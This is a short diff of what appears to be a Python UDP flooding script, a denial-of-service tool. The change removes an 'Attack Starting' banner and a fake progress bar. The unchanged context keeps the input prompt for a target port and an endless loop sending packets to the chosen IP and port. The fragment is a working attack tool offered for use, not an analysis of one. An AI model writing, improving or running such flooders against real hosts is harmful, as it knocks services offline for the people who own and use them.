@@ -42,17 +42,6 @@ portnya = input("Port       : ")
 sent = 0
 
 os.system("clear")
-os.system("toilet Attack Starting")
-print "[                    ] 0% "
-time.sleep(1)
-print "[=====               ] 25%"
-time.sleep(2)
-print "[==========          ] 50%"
-time.sleep(2)
-print "[===============     ] 75%"
-time.sleep(2)
-print "[====================] 100%"
-time.sleep(2)
 
 while True:
     socket.sendto(bytes, (ipnya,portnya))
